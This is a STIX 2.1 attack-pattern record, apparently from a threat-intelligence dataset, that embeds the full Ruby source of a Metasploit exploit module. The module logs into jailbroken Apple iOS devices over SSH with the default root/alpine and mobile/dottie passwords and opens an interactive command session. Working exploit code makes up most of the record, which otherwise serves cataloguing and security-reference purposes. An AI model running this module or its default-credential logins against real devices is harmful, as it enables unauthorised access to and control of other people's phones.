{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7f9f4164-3a38-4748-9b57-efec6f479774",
    "created": "2024-08-14T16:34:13.423795Z",
    "modified": "2024-08-14T16:34:13.423799Z",
    "name": "Apple iOS Default SSH Password Vulnerability",
    "description": " This module exploits the default credentials of Apple iOS when it has been jailbroken and the passwords for the 'root' and 'mobile' users have not been changed.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/apple_ios/ssh/cydia_default_ssh.rb",
            "external_id": "cydia_default_ssh.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'net/ssh'\nrequire 'net/ssh/command_stream'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::SSH\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Apple iOS Default SSH Password Vulnerability',\n        'Description' => %q{\n          This module exploits the default credentials of Apple iOS when it\n          has been jailbroken and the passwords for the 'root' and 'mobile'\n          users have not been changed.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'hdm'\n        ],\n        'References' => [\n          ['OSVDB', '61284']\n        ],\n        'DefaultOptions' => {\n          'EXITFUNC' => 'thread'\n        },\n        'Payload' => {\n          'Compat' => {\n            'PayloadType' => 'cmd_interact',\n            'ConnectionType' => 'find'\n          }\n        },\n        'Platform' => 'unix',\n        'Arch' => ARCH_CMD,\n        'Targets' => [\n          ['Apple iOS', { 'accounts' => [ [ 'root', 'alpine' ], [ 'mobile', 'dottie' ]] } ],\n        ],\n        'Privileged' => true,\n        'DisclosureDate' => '2007-07-02',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RHOST(),\n        Opt::RPORT(22)\n      ], self.class\n    )\n\n    register_advanced_options(\n      [\n        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),\n        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])\n      ]\n    )\n  end\n\n  def post_auth?\n    true\n  end\n\n  def rhost\n    datastore['RHOST']\n  end\n\n  def rport\n    datastore['RPORT']\n  end\n\n  def do_login(user, pass)\n    opts = ssh_client_defaults.merge({\n      auth_methods: ['password', 'keyboard-interactive'],\n      port: rport,\n      password: pass\n    })\n\n    opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']\n\n    begin\n      ssh = nil\n      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        ssh = Net::SSH.start(rhost, user, opts)\n      end\n    rescue Rex::ConnectionError\n      return\n    rescue Net::SSH::Disconnect, ::EOFError\n      print_error \"#{rhost}:#{rport} SSH - Disconnected during negotiation\"\n      return\n    rescue ::Timeout::Error\n      print_error \"#{rhost}:#{rport} SSH - Timed out during negotiation\"\n      return\n    rescue Net::SSH::AuthenticationFailed\n      print_error \"#{rhost}:#{rport} SSH - Failed authentication\"\n    rescue Net::SSH::Exception => e\n      print_error \"#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}\"\n      return\n    end\n\n    if ssh\n      conn = Net::SSH::CommandStream.new(ssh)\n      ssh = nil\n      return conn\n    end\n\n    return nil\n  end\n\n  def exploit\n    target['accounts'].each do |info|\n      user, pass = info\n      print_status(\"#{rhost}:#{rport} - Attempt to login as '#{user}' with password '#{pass}'\")\n      conn = do_login(user, pass)\n      next unless conn\n\n      print_good(\"#{rhost}:#{rport} - Login Successful ('#{user}:#{pass})\")\n      handler(conn.lsock)\n      break\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-07-02",
    "x_mitre_platforms": [
        "unix'"
    ]
}